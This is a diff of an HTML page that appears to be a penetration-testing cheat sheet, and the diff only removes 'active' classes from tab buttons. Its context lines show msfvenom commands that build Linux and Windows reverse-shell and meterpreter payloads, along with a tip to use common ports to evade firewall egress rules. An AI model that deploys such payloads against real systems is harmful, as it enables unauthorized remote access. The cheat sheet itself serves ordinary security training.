@@ -336,7 +336,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 <p><small><em>Note: stageless payload can catch with nc directly</em></small></p>
 <h4 id="windows-x64">Windows x64</h4>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Staged exe</button>
+<button data-tabset="set1" data-tabcontent="tab1" >Staged exe</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >Stageless exe</button>
 
@@ -364,7 +364,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div></div></p>
 <h4 id="windows-x86">Windows x86</h4>
 <p>
-<button data-tabset="set2" data-tabcontent="tab1" class="active">Staged exe</button>
+<button data-tabset="set2" data-tabcontent="tab1" >Staged exe</button>
 
 <button data-tabset="set2" data-tabcontent="tab2" >Stageless exe</button>
 
@@ -386,7 +386,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 <small><em>Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</em></small></p>
 <h4 id="linux-amd64">Linux amd64</h4>
 <p>
-<button data-tabset="set3" data-tabcontent="tab1" class="active">Stageless elf</button>
+<button data-tabset="set3" data-tabcontent="tab1" >Stageless elf</button>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;LOCAL_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f elf &gt; rev.elf
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.31 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f elf &gt; rev.elf
@@ -398,7 +398,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div></div></p>
 <h4 id="others">Others</h4>
 <p>
-<button data-tabset="set4" data-tabcontent="tab1" class="active">Staged python</button>
+<button data-tabset="set4" data-tabcontent="tab1" >Staged python</button>
 
 <div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Generate shellcode in python format and avoid specific bytes
 </span></span><span class="line"><span class="cl"><span class="go">msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f python -v shellcode --platform windows -b&#39;\x00\x0a\0d&#39; LHOST=&lt;LOCAL_IP&gt; LPORT=&lt;LOCAL_PORT&gt;
